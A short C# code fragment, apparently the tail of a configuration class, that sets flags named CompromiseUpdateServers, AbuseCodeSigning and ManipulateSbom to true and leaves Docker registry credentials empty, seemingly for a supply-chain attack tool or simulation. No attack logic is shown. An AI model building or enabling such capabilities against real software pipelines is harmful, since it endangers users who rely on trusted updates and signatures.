    public static bool CompromiseUpdateServers = true;
    public static bool AbuseCodeSigning = true;
    public static bool ManipulateSbom = true;
    public static string DockerRegistryUsername = "";
    public static string DockerRegistryPassword = "";
}